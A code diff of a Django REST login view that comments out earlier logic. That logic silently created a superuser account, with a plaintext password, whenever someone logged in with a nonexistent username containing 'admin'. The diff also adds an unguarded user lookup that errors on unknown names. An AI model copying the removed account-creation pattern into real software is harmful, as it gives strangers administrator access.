@@ -71,18 +71,20 @@ class LoginView(APIView):
         # print(request.POST)
         username = request.data.get("username")
         password = request.data.get("password")
-        exists = True
-        if "admin" in str(username).lower():
-            try:
-                if User.objects.get(username=username):
-                    exists = True
-            except Exception as e:
-                exists = False
-            newuser = User.objects.get_or_create(username=username, first_name="admin", last_name="admin",
-                                                 email="admin@admin.com", password=password, is_active=True, is_staff=True, is_superuser=True) if not exists else None
-        if exists:
-            Token.objects.get_or_create(user=User.objects.get(
-                username=username))
+        # exists = False
+        # if "admin" in str(username).lower():
+        #     try:
+        #         if User.objects.get(username=username):
+        #             exists = True
+        #     except Exception as e:
+        #         exists = False
+        #     newuser,created = User.objects.get_or_create(username=username, first_name="admin", last_name="admin",
+        #                                          email="admin@admin.com", password=password, is_active=True, is_staff=True, is_superuser=True) if not exists else None
+        # if exists:
+        #     if not user.token:
+        #         token,created=Token.objects.get_or_create(user=User.objects.get(
+        #             username=username))
+        user=User.objects.get(username=username)
         user = authenticate(username=username, password=password)
         # print(request.data)
         screens_set = set()
